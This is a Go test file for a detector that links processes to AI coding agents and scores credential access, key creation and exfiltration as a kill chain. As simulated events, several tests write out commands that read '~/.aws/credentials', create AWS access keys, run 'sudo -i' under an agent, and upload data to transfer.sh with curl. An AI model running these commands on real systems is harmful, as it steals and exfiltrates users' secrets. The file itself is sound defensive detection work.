// Copyright 2026 Cisco Systems, Inc. and its affiliates
// Copyright (c) 2026 Mike Storm. All rights reserved.
//
// Derived from ShadowClaw -- Universal Shadow AI Detector, by Mike Storm,
// Distinguished Engineer, CCIE Security 13847. Reimplemented in Go and
// absorbed into the DefenseClaw gateway; see NOTICE for the modifications.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package agentchain

import (
	"testing"
	"time"

	"github.com/defenseclaw/defenseclaw/internal/sensor/scoring"
	"github.com/defenseclaw/defenseclaw/internal/sensor/tactics"
)

func fixedClock(base time.Time) (func() time.Time, func(time.Duration)) {
	now := base
	return func() time.Time { return now }, func(d time.Duration) { now = now.Add(d) }
}

// TestLineageGateIsTheFalsePositiveControl is the single most important
// behaviour in this package: the same sudo is nothing on its own and a signal
// under an agent.
func TestLineageGateIsTheFalsePositiveControl(t *testing.T) {
	t.Parallel()
	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)

	// A developer's own shell running sudo.
	tracker.ObserveExec(100, InitPID, InitPID, "login", "-zsh")
	tracker.ObserveExec(101, 100, 100, "zsh", "-zsh")
	tracker.ObserveExec(102, 101, 101, "sudo", "sudo -i")
	if _, ok := tracker.Attribute(102); ok {
		t.Fatal("sudo under a developer shell was attributed to an agent")
	}
	if got := tracker.AttributionState(102); got != StateOrphaned {
		t.Errorf("AttributionState = %q, want %q", got, StateOrphaned)
	}

	// The same sudo as a descendant of claude.
	tracker.ObserveExec(200, InitPID, InitPID, "claude", "claude --dangerously-skip-permissions")
	tracker.ObserveExec(201, 200, 200, "sh", "sh -c 'sudo -i'")
	tracker.ObserveExec(202, 201, 201, "sudo", "sudo -i")
	attribution, ok := tracker.Attribute(202)
	if !ok {
		t.Fatal("sudo under claude was not attributed")
	}
	if attribution.AgentName != "claude" || attribution.RootPID != 200 {
		t.Fatalf("attribution = %+v, want claude at pid 200", attribution)
	}
	if attribution.Depth != 2 {
		t.Errorf("Depth = %d, want 2 (claude -> sh -> sudo)", attribution.Depth)
	}
	if attribution.Via != "ancestry" {
		t.Errorf("Via = %q, want %q", attribution.Via, "ancestry")
	}
}

// TestAttributionSurvivesTheChildExiting pins the reason exited records are
// kept: the eight-millisecond cat is exactly the event worth attributing.
func TestAttributionSurvivesTheChildExiting(t *testing.T) {
	t.Parallel()
	clock, advance := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)
	tracker.ObserveExec(300, InitPID, InitPID, "claude", "claude")
	tracker.ObserveExec(301, 300, 300, "cat", "cat /Users/dev/.aws/credentials")
	tracker.ObserveExit(301)

	if _, ok := tracker.Attribute(301); !ok {
		t.Fatal("an exited child lost its attribution immediately")
	}
	advance(lineageTTL + time.Second)
	if removed := tracker.Reap(); removed != 1 {
		t.Fatalf("Reap() removed %d records, want 1", removed)
	}
	if _, ok := tracker.Attribute(301); ok {
		t.Fatal("a reaped record was still attributed")
	}
}

// TestAgentInsideAGenericInterpreterIsAttributed covers the case the inventory
// process detector cannot see, because it matches basenames and discards argv.
func TestAgentInsideAGenericInterpreterIsAttributed(t *testing.T) {
	t.Parallel()
	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)
	tracker.ObserveExec(400, InitPID, InitPID, "python3", "python3 -m langgraph.cli serve")
	tracker.ObserveExec(401, 400, 400, "curl", "curl -T - https://transfer.sh/x")

	attribution, ok := tracker.Attribute(401)
	if !ok {
		t.Fatal("a child of an agent framework inside python3 was not attributed")
	}
	if attribution.AgentName != "python3" || attribution.Via != "ancestry" {
		t.Fatalf("attribution = %+v", attribution)
	}
	root, ok := tracker.Attribute(400)
	if !ok || root.Via != "cmdline" {
		t.Fatalf("root attribution = %+v, want via cmdline", root)
	}
}

// TestBootPersistentIsDistinguishedFromOrphaned pins that "no agent above it"
// is described rather than collapsed into one silent negative.
func TestBootPersistentIsDistinguishedFromOrphaned(t *testing.T) {
	t.Parallel()
	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)
	// Deliberately not an AI process: "ollama serve" would match the
	// provider-SDK command-line pattern and be attributed as an agent in its
	// own right, which is correct and a different case from this one.
	tracker.ObserveExec(500, InitPID, InitPID, "cupsd", "/usr/sbin/cupsd -l")
	if got := tracker.AttributionState(500); got != StateBootPersistent {
		t.Errorf("AttributionState(launch item) = %q, want %q", got, StateBootPersistent)
	}
	if got := tracker.AttributionState(9999); got != StateOrphaned {
		t.Errorf("AttributionState(unknown pid) = %q, want %q", got, StateOrphaned)
	}
}

// TestAForkedAgentIsOneSessionNotMany reproduces what a real Linux host
// showed: an agent that is a shell script forks children which inherit its
// argv, so each child independently looks like the agent. Rooting each at
// itself splits one agent session into one session per command it ran, which
// is exactly the fragmentation this package exists to prevent.
func TestAForkedAgentIsOneSessionNotMany(t *testing.T) {
	t.Parallel()
	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)

	// /tmp/claude is a bash script; every command it runs is first a fork that
	// still carries the script's own command line.
	tracker.ObserveExec(700, InitPID, InitPID, "claude", "/bin/bash /tmp/claude")
	for _, pid := range []int{701, 702, 703} {
		tracker.ObserveExec(pid, 700, 700, "claude", "/bin/bash /tmp/claude")
	}
	// And a grandchild fork, to prove the walk reaches the outermost ancestor
	// rather than stopping one level up.
	tracker.ObserveExec(704, 703, 703, "claude", "/bin/bash /tmp/claude")

	roots := map[int]bool{}
	for _, pid := range []int{700, 701, 702, 703, 704} {
		attribution, ok := tracker.Attribute(pid)
		if !ok {
			t.Fatalf("pid %d was not attributed", pid)
		}
		if attribution.AgentName != "claude" {
			t.Fatalf("pid %d attributed to %q", pid, attribution.AgentName)
		}
		roots[attribution.RootPID] = true
	}
	if len(roots) != 1 {
		t.Fatalf("one agent produced %d session roots: %v", len(roots), roots)
	}
	if !roots[700] {
		t.Fatalf("session root = %v, want the outermost agent at pid 700", roots)
	}
}

// TestDistinctAgentsKeepDistinctSessions pins that the same-name walk does not
// over-merge: two unrelated agents of the same kind are two sessions.
func TestDistinctAgentsKeepDistinctSessions(t *testing.T) {
	t.Parallel()
	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)
	tracker.ObserveExec(800, InitPID, InitPID, "claude", "claude")
	tracker.ObserveExec(900, InitPID, InitPID, "claude", "claude")

	first, _ := tracker.Attribute(800)
	second, _ := tracker.Attribute(900)
	if first.RootPID == second.RootPID {
		t.Fatalf("two unrelated agents merged into one session at pid %d", first.RootPID)
	}
}

// TestANestedDifferentAgentIsNotMergedUpward pins that the walk stops at the
// first ancestor with a different identity: an agent that launches a different
// agent is two sessions, not one.
func TestANestedDifferentAgentIsNotMergedUpward(t *testing.T) {
	t.Parallel()
	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)
	tracker.ObserveExec(1000, InitPID, InitPID, "claude", "claude")
	tracker.ObserveExec(1001, 1000, 1000, "codex", "codex exec")

	nested, ok := tracker.Attribute(1001)
	if !ok {
		t.Fatal("the nested agent was not attributed")
	}
	if nested.AgentName != "codex" || nested.RootPID != 1001 {
		t.Fatalf("nested attribution = %+v, want codex rooted at itself", nested)
	}
}

// TestAncestryWalkTerminatesOnACycle guards against a pid table that contains
// a loop after pid reuse.
func TestAncestryWalkTerminatesOnACycle(t *testing.T) {
	t.Parallel()
	clock, _ := fixedClock(time.Unix(1_760_000_000, 0))
	tracker := newTracker(lineageTTL, clock)
	tracker.ObserveExec(600, 601, 601, "sh", "sh")
	tracker.ObserveExec(601, 600, 600, "sh", "sh")
	done := make(chan struct{})
	go func() {
		defer close(done)
		_, _ = tracker.Attribute(600)
	}()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("Attribute() did not terminate on a cyclic pid table")
	}
}

// TestAuthorityDecaysButIsNotFoldedIntoScoring pins the distinction between
// authority and confidence.
func TestAuthorityDecaysButIsNotFoldedIntoScoring(t *testing.T) {
	t.Parallel()
	if got := (Attribution{Depth: 0}).Authority(); got != 1 {
		t.Errorf("depth 0 authority = %v, want 1", got)
	}
	if got := (Attribution{Depth: 3}).Authority(); got > 0.0011 || got < 0.0009 {
		t.Errorf("depth 3 authority = %v, want ~0.001", got)
	}
	// The ordinary agent -> sh -> cat chain must still score in full. If
	// authority were multiplied into the weight this would collapse to 0.
	session := NewSession(1, "claude", time.Unix(0, 0))
	session.Record(Observation{
		Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
		Confidence: 1.0, At: time.Unix(10, 0), Detail: "~/.aws/credentials",
	})
	score, _ := session.Score(scoring.KillChainMinStages)
	if score != scoring.WeightCredentialAccess {
		t.Fatalf("depth-2 credential read scored %d, want the full %d",
			score, scoring.WeightCredentialAccess)
	}
}

// TestProgressedRequiresOrderNotJustCount is what separates an incident from a
// busy afternoon.
func TestProgressedRequiresOrderNotJustCount(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)

	forward := NewSession(1, "claude", base)
	forward.Record(Observation{Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
		Detail: "a", Confidence: 1, At: base})
	forward.Record(Observation{Tactic: tactics.IdentityCreation, SignalID: "agent_identity_creation",
		Detail: "b", Confidence: 1, At: base.Add(time.Minute)})
	forward.Record(Observation{Tactic: tactics.Exfiltration, SignalID: "agent_public_exfil_surface",
		Detail: "c", Confidence: 1, At: base.Add(2 * time.Minute)})
	if !forward.Progressed(3) {
		t.Fatal("an in-order three-stage session did not count as progression")
	}

	backward := NewSession(2, "claude", base)
	backward.Record(Observation{Tactic: tactics.Exfiltration, SignalID: "agent_public_exfil_surface",
		Detail: "c", Confidence: 1, At: base})
	backward.Record(Observation{Tactic: tactics.IdentityCreation, SignalID: "agent_identity_creation",
		Detail: "b", Confidence: 1, At: base.Add(time.Hour)})
	backward.Record(Observation{Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
		Detail: "a", Confidence: 1, At: base.Add(2 * time.Hour)})
	if backward.Progressed(3) {
		t.Fatal("a reverse-order session counted as progression")
	}

	if forward.Progressed(4) {
		t.Fatal("three stages counted as progression through four")
	}
}

// TestChainBonusLiftsAThreeStageSessionToCritical is the end-to-end shape of
// the scoring contract, evaluated through the session rather than the weights.
func TestChainBonusLiftsAThreeStageSessionToCritical(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	session := NewSession(1, "claude", base)
	session.Record(Observation{Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
		Detail: "~/.aws/credentials", Confidence: 1, At: base})
	session.Record(Observation{Tactic: tactics.IdentityCreation, SignalID: "agent_identity_creation",
		Detail: "aws iam create-access-key", Confidence: 1, At: base.Add(time.Minute)})
	session.Record(Observation{Tactic: tactics.Exfiltration, SignalID: "agent_public_exfil_surface",
		Detail: "transfer.sh", Confidence: 1, At: base.Add(2 * time.Minute)})

	score, signals := session.Score(scoring.KillChainMinStages)
	if scoring.SeverityFor(score) != scoring.SeverityCritical {
		t.Fatalf("three-stage chain scored %d (%s), want critical",
			score, scoring.SeverityFor(score))
	}
	var sawChain bool
	for _, signal := range signals {
		if signal.ID == "agent_kill_chain" {
			sawChain = true
			if signal.Detail != "credential_access -> identity_creation -> exfiltration" {
				t.Errorf("chain detail = %q", signal.Detail)
			}
		}
	}
	if !sawChain {
		t.Error("no agent_kill_chain signal was emitted for a progressed session")
	}
}

// TestRepeatedObservationsAreOneStage pins the dedup key: a loop reading the
// same credential must not look like escalating activity.
func TestRepeatedObservationsAreOneStage(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	session := NewSession(1, "claude", base)
	for index := 0; index < 25; index++ {
		session.Record(Observation{
			Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
			Detail: "~/.aws/credentials", Confidence: 1,
			At: base.Add(time.Duration(index) * time.Second),
		})
	}
	score, _ := session.Score(scoring.KillChainMinStages)
	if score != scoring.WeightCredentialAccess {
		t.Fatalf("25 reads of the same credential scored %d, want %d",
			score, scoring.WeightCredentialAccess)
	}
	if session.Progressed(scoring.KillChainMinStages) {
		t.Fatal("repetition of one tactic counted as chain progression")
	}
}

// TestExpireBoundsTheChainToItsWindow pins that a chain is a chain within a
// window rather than over the lifetime of a long-running agent.
func TestExpireBoundsTheChainToItsWindow(t *testing.T) {
	t.Parallel()
	base := time.Unix(1_760_000_000, 0)
	session := NewSession(1, "claude", base)
	session.Record(Observation{Tactic: tactics.CredentialAccess, SignalID: "agent_credential_access",
		Detail: "a", Confidence: 1, At: base})
	session.Record(Observation{Tactic: tactics.Exfiltration, SignalID: "agent_public_exfil_surface",
		Detail: "c", Confidence: 1, At: base.Add(6 * time.Hour)})
	session.Expire(base.Add(time.Hour))
	if seen := session.TacticsSeen(); len(seen) != 1 || seen[0] != tactics.Exfiltration {
		t.Fatalf("TacticsSeen after expiry = %v, want only exfiltration", seen)
	}
}

// TestLongestOrderedRunRejectsDisjointAscendingPairs is the shape the old
// pair-counting missed.
//
// Progressed used to count every forward-going adjacent pair anywhere in the
// timeline and compare the total against minimum-1. Two unrelated ascending
// pairs then cleared a three-stage threshold even though the session never
// moved through three stages in order -- and that threshold is what awards
// the kill-chain bonus, which is what lifts a finding to critical.
func TestLongestOrderedRunRejectsDisjointAscendingPairs(t *testing.T) {
	at := func(seconds ...int) []time.Time {
		base := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
		times := make([]time.Time, len(seconds))
		for index, second := range seconds {
			times[index] = base.Add(time.Duration(second) * time.Second)
		}
		return times
	}

	for _, test := range []struct {
		name    string
		seconds []int
		want    int
	}{
		{"two disjoint ascending pairs are not a three-stage chain", []int{5, 6, 1, 2}, 2},
		{"a genuine three-stage progression", []int{1, 2, 3}, 3},
		{"a later stage reached first breaks the run", []int{1, 10, 2}, 2},
		{"stages that skip one still progress", []int{1, 10, 2, 11}, 3},
		{"fully reversed", []int{9, 5, 1}, 1},
		{"simultaneous stages still count as ordered", []int{4, 4, 4}, 3},
		{"single stage", []int{7}, 1},
	} {
		t.Run(test.name, func(t *testing.T) {
			if got := longestOrderedRun(at(test.seconds...)); got != test.want {
				t.Fatalf("longestOrderedRun(%v) = %d, want %d", test.seconds, got, test.want)
			}
		})
	}
}

// TestRecycledPidLosesTheOldAgentIdentity is the lineage gate's own integrity
// check. The gate is the entire false-positive control for the host plane, so
// an agent name left on a pid that now belongs to something else turns
// ordinary developer activity -- in that process and in every descendant --
// into scored findings.
func TestRecycledPidLosesTheOldAgentIdentity(t *testing.T) {
	for _, test := range []struct {
		name  string
		reuse func(tracker *Tracker)
	}{
		{
			name: "the kernel recycled the pid after the agent exited",
			reuse: func(tracker *Tracker) {
				tracker.ObserveExit(200)
				tracker.ObserveProcessTable([]ProcessRow{{PID: 200, PPID: 1, Name: "cupsd"}})
			},
		},
		{
			name: "the agent wrapper exec'd into a plain shell",
			reuse: func(tracker *Tracker) {
				tracker.ObserveExec(200, 1, 1, "sh", "sh -c true")
			},
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			tracker := NewTracker()
			tracker.ObserveProcessTable([]ProcessRow{{PID: 200, PPID: 1, Name: "claude"}})
			if _, ok := tracker.Attribute(200); !ok {
				t.Fatal("precondition: the agent was not attributed")
			}

			test.reuse(tracker)
			// Something ordinary runs under the recycled pid.
			tracker.ObserveProcessTable([]ProcessRow{{PID: 201, PPID: 200, Name: "cat"}})

			if attribution, ok := tracker.Attribute(200); ok {
				t.Errorf("the recycled pid is still attributed to %q", attribution.AgentName)
			}
			if attribution, ok := tracker.Attribute(201); ok {
				t.Errorf("a child of the recycled pid was attributed to %q; "+
					"the lineage gate would score ordinary activity", attribution.AgentName)
			}
		})
	}
}

// TestSameAgentWalkFollowsTheResponsiblePid covers the macOS shape. A shell an
// agent spawned is reparented to launchd, so its ppid no longer points at the
// agent and only the responsible pid does. Following ppid alone rooted each
// reparented fork at itself and split one agent session into many.
func TestSameAgentWalkFollowsTheResponsiblePid(t *testing.T) {
	tracker := NewTracker()
	// The agent itself.
	tracker.ObserveExec(300, 1, 1, "claude", "claude")
	// A same-agent fork that has been reparented away from it.
	tracker.ObserveExec(301, InitPID, 300, "claude", "claude")

	attribution, ok := tracker.Attribute(301)
	if !ok {
		t.Fatal("the reparented fork was not attributed at all")
	}
	if attribution.RootPID != 300 {
		t.Fatalf("RootPID = %d, want 300: the reparented fork rooted itself, "+
			"so one agent session splits into one per fork", attribution.RootPID)
	}
}

// TestRecordKeepsTheEarliestSightingWhileAdoptingConfidence pins that a
// stage's time never moves forward.
//
// Progressed reads these timestamps to decide whether the session moved
// through its stages in order. Adopting a later sighting's time along with
// its higher confidence could reorder a chain that had already formed -- or
// manufacture one that never happened.
func TestRecordKeepsTheEarliestSightingWhileAdoptingConfidence(t *testing.T) {
	base := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
	session := NewSession(100, "claude", base)

	early := Observation{
		SignalID: "agent_credential_access", Tactic: tactics.CredentialAccess,
		At: base, Confidence: 0.5,
	}
	late := early
	late.At = base.Add(10 * time.Minute)
	late.Confidence = 0.95

	session.Record(early)
	session.Record(late)

	if got := session.FirstAt(tactics.CredentialAccess); !got.Equal(base) {
		t.Fatalf("FirstAt = %s, want the earlier sighting %s", got, base)
	}
	observations := session.Observations()
	if len(observations) != 1 {
		t.Fatalf("kept %d observations for one key", len(observations))
	}
	if observations[0].Confidence != 0.95 {
		t.Errorf("confidence = %v, want the higher 0.95", observations[0].Confidence)
	}

	// An earlier sighting at lower confidence still pulls the start back.
	earlier := early
	earlier.At = base.Add(-5 * time.Minute)
	earlier.Confidence = 0.2
	session.Record(earlier)
	if got := session.FirstAt(tactics.CredentialAccess); !got.Equal(earlier.At) {
		t.Fatalf("FirstAt = %s, want the earliest sighting %s", got, earlier.At)
	}
	if session.Observations()[0].Confidence != 0.95 {
		t.Error("an earlier low-confidence sighting downgraded the recorded confidence")
	}
}
